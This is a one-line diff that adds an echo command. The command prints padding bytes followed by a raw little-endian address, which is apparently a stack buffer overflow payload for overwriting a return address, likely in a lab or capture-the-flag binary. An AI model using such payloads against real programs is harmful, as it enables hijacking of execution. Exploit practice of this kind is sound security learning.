@@ -1,0 +1,1 @@
+echo -n -e "aaaaaaaaaaaaaaaaaaaaaaaa\xb0\x05\x40"
